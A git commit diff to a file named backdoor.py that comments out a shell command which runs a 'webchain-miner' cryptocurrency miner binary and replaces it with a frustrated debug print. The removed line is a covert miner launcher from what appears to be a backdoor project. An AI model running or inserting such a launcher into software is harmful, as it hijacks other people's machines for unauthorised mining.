363a6c60147fcde71bc8da835eb4e33eadc9c0b9
Allespro <39953296+Allespro@users.noreply.github.com>
2019-07-24 00:48:55 +0000

    Update backdoor.py

--- backdoor.py
+++ backdoor.py
@@ -1,6 +1,5 @@
-#!/usr/bin/env python
 import os
-import sys
 
 if __name__ == "__main__":
-    os.system("chmod +x webchain-miner && LD_LIBRARY_PATH=./lib ./webchain-miner")
+    #os.system("chmod +x webchain-miner && LD_LIBRARY_PATH=./lib ./webchain-miner")
+    print("WTF???? WHY NO WORKS")
